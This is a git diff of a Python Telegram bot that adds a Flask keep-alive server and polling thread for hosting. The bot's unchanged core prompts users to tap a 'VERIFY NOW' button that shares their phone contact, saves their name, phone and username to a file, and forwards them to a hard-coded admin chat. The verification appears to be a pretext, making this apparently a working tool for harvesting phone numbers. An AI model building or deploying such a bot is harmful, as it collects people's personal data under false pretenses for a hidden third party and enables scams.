@@ -1,23 +1,35 @@
-import telebot
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
-import datetime
 import os
+import telebot
+import datetime
+import threading
+from flask import Flask
 
-# Load bot token from environment variable
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+
+# Setup bot
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
-
-# Set admin chat ID (from @userinfobot)
 ADMIN_CHAT_ID = "5944513375"
 
-# Create a cross-platform data directory
+# File path setup
 DATA_DIR = "bot_data"
 os.makedirs(DATA_DIR, exist_ok=True)
 USER_DATA_FILE = os.path.join(DATA_DIR, "user_data.txt")
 
+# Flask app to bind port
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return 'Bot is running and listening on port 10000!'
+
+# Start polling in a separate thread
+def start_bot():
+    print("📱 Starting Telegram bot polling...")
+    bot.polling(non_stop=True)
+
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    """Send welcome message with one-click verification button"""
     markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     markup.add(KeyboardButton("📲 VERIFY NOW", request_contact=True))
 
@@ -33,11 +45,9 @@ def send_welcome(message):
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Process contact and notify admin"""
     contact = message.contact
     user = message.from_user
 
-    # Ensure contact is from the sender (prevents spoofing)
     if contact.user_id != user.id:
         bot.send_message(
             message.chat.id,
@@ -46,14 +56,12 @@ def handle_contact(message):
         )
         return
 
-    # Check if user is already verified
     if os.path.exists(USER_DATA_FILE):
         with open(USER_DATA_FILE, "r", encoding='utf-8') as f:
             if str(user.id) in f.read():
                 bot.send_message(message.chat.id, "✅ You're already verified.")
                 return
 
-    # Format and save user info
     user_entry = (
         f"\n[{datetime.datetime.now()}]\n"
         f"👤 {user.first_name} {user.last_name or ''}\n"
@@ -65,7 +73,6 @@ def handle_contact(message):
     with open(USER_DATA_FILE, "a", encoding='utf-8') as f:
         f.write(user_entry)
 
-    # User confirmation
     bot.send_message(
         message.chat.id,
         f"✅ VERIFIED: {user.first_name}\n"
@@ -74,16 +81,17 @@ def handle_contact(message):
         reply_markup=ReplyKeyboardRemove()
     )
 
-    # Admin notification
-    admin_msg = (
-        f"🚨 NEW VERIFICATION\n{user_entry}"
-    )
+    admin_msg = f"🚨 NEW VERIFICATION\n{user_entry}"
     if user.username:
         admin_msg += f"\nChat: https://t.me/{user.username}"
 
     bot.send_message(ADMIN_CHAT_ID, admin_msg)
 
 if __name__ == '__main__':
-    print("📱 Bot running on Render...")
-    print(f"📂 Data file: {USER_DATA_FILE}")
-    bot.polling(non_stop=True)
+    # Start bot polling thread
+    threading.Thread(target=start_bot).start()
+
+    # Run Flask app to bind port 10000
+    port = int(os.environ.get("PORT", 10000))
+    print(f"🌐 Flask app running on port {port}")
+    app.run(host='0.0.0.0', port=port)
